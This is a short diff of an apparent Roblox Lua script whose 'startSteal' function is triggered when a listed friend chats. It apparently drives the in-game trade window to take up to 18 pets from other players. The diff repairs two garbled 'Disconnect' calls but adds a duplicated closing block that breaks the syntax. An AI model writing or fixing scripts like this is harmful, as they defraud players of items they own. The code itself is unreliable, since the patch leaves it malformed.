@@ -274,11 +274,11 @@ local function startSteal(plr)
         end
 
         if not LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
-            if declineConn then declineConn:oonnect() end
+            if declineConn then declineConn:Disconnect() end
             return
         end
 
-        if declineConn then declineConn:ronnect() end
+        if declineConn then declineConn:Disconnect() end
 
         for i = 1, math.min(18, #hits) do
             local pet = hits[i]
@@ -312,6 +312,8 @@ Players.PlayerAdded:Connect(function(p)
     task.wait(2)
     if table.find(Friends, p.Name) then
         p.Chatted:Connect(function() startSteal(p) end)
+    end
+end)
     end
 end)
 
